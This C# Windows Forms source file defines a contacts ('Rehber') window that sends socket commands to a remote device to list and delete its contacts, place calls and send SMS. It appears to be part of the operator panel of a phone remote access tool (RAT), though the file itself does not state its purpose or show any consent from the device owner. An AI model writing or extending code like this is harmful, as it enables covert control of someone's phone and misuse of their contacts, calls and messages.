using System;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace SV
{
    public partial class Rehber : Form
    {
        Socket sco; public string ID = "";
        public Rehber(Socket sck, string aydi)
        {
            InitializeComponent();
            ID = aydi; sco = sck;
        }

        private void ekleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Ekle(sco).Show();
        }

        private void silToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try { 
            byte[] bayt = Encoding.UTF8.GetBytes("REHBERSIL|" + listView1.SelectedItems[0].Text + "|");
            Gonderici.Send(sco, bayt, 0, bayt.Length, 59999);
                listView1.SelectedItems[0].Remove();
                Text = "Rehber";
            }
            catch (Exception) { }
        }

        private void yenileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try { 
            byte[] bayt = Encoding.UTF8.GetBytes("REHBERIVER|");
            Gonderici.Send(sco, bayt, 0, bayt.Length, 59999);
                Text = "Rehber";
            }
            catch (Exception) { }
        }

        private void araToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if(listView1.SelectedItems.Count == 1)
            {
                try
                {
                    byte[] polat_alemdar = Encoding.UTF8.GetBytes("ARA|" + listView1.SelectedItems[0].SubItems[1].Text + "|");
                    Gonderici.Send(sco, polat_alemdar, 0, polat_alemdar.Length, 59999);
                    MessageBox.Show("Arama talimatı gönderildi.", "Arama", MessageBoxButtons.OK, MessageBoxIcon.Information);

                }
                catch (Exception) { }
            }
        }

        private void smsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                new SMS(sco, listView1.SelectedItems[0].SubItems[1].Text).Show();
            }
        }

        private void kopyalaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                Clipboard.SetText(listView1.SelectedItems[0].SubItems[1].Text);
            }
         }
    }
}
